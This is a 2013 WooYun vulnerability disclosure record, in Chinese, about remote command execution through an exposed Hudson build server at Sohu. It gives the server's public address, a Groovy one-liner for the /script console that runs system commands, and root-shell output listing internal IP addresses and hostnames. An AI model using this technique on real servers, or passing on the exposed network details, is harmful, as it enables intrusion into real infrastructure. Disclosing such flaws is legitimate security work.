{"id": 13399, "wybug_id": "wooyun-2013-019506", "wybug_title": "搜狐某应用系统存在命令执行漏洞直入内网（信息已补全）", "wybug_corp": "搜狐", "wybug_author": "tojen", "wybug_date": "2013-03-04 15:24", "wybug_open_date": "2013-04-18 15:24", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "内网渗透", "入侵内网", "命令执行内网渗透", "远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-03-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-04-18：\t细节向公众公开  简要描述： 搜狐的代码构建系统采用了某系统，存在高危漏洞，虽生僻，但剑走偏锋，直入内网 详细说明：  搜狐的代码构建系统采用了某系统存在命令执行漏洞，攻击者如果能找到，有剑走偏锋的优势，是一个绝好的可持续性攻击入口。\nhttp://220.181.26.142:8080/\n这是一套叫Hudon的代码构建系统，这个有几个接口/script,可以直接执行系统命令： Process p=\"ls -la /opt/apps/hudson\".execute() println \"${p.text}\" [root@sohu root]# cat /etc/hostscat /etc/hosts# Do not remove the following line, or various programs# that require network functionality will fail.127.0.0.1               bbs.stock.sohu.com localhost.localdomain localhost192.168.8.252           corp192.168.41.201          stockdb192.168.101.126         s.sogou.com192.168.101.126         bbs.sogou.com   漏洞证明：  [root@sohu root]# ifconfigifconfigeth0      Link encap:Ethernet  HWaddr 00:12:79:D4:D4:BF          inet addr:192.168.105.92  Bcast:192.168.105.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:458621822 errors:0 dropped:0 overruns:0 frame:0          TX packets:375864186 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:444224593 (423.6 Mb)  TX bytes:1171044980 (1116.7 Mb)          Interrupt:25lo        Link encap:Local Loopback          inet addr:127.0.0.1  Mask:255.0.0.0          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:1133214 errors:0 dropped:0 overruns:0 frame:0          TX packets:1133214 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0          RX bytes:62820806 (59.9 Mb)  TX bytes:62820806 (59.9 Mb)[root@sohu root]# cat /etc/hostscat /etc/hosts# Do not remove the following line, or various programs# that require network functionality will fail.127.0.0.1               bbs.stock.sohu.com localhost.localdomain localhost192.168.8.252           corp192.168.41.201          stockdb192.168.101.126         s.sogou.com192.168.101.126         bbs.sogou.com-------------------------------------------[@zjm_200_47 ~]# ifconfigifconfigeth0      Link encap:Ethernet  HWaddr E4:1F:13:B8:9E:64          inet addr:192.168.200.47  Bcast:192.168.200.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:7375924720 errors:0 dropped:0 overruns:0 frame:0          TX packets:6954887893 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:7703143689471 (7.0 TiB)  TX bytes:6950317304733 (6.3 TiB)          Interrupt:169 Memory:92000000-92012800eth1      Link encap:Ethernet  HWaddr E4:1F:13:B8:9E:66          inet addr:61.135.132.207  Bcast:61.135.132.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:1254635710 errors:0 dropped:0 overruns:0 frame:0          TX packets:37377219 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:87002218070 (81.0 GiB)  TX bytes:2761555697 (2.5 GiB)          Interrupt:138 Memory:94000000-94012800lo        Link encap:Local Loopback          inet addr:127.0.0.1  Mask:255.0.0.0          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:84104567 errors:0 dropped:0 overruns:0 frame:0          TX packets:84104567 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0          RX bytes:746876303918 (695.5 GiB)  TX bytes:746876303918 (695.5 GiB)[@zjm_200_47 ~]# cat /etc/hostscat /etc/hosts# Do not remove the following line, or various programs# that require network functionality will fail.127.0.0.1       localhost.localdomain localhost#::1            localhost6.localdomain6 localhost610.10.79.56     zw_79_56192.168.200.42  zjm_200_42192.168.200.43  zjm_200_43127.0.0.1  zjm_200_47   修复方案：     版权声明：转载请注明来源 tojen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-03-04 15:35 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-05 17:37 |    \t\t三十度 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 本屌精通各种花式撸管，装逼32式炉火纯青。...)\t\t \n  我想知道新浪有多少台交换机    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}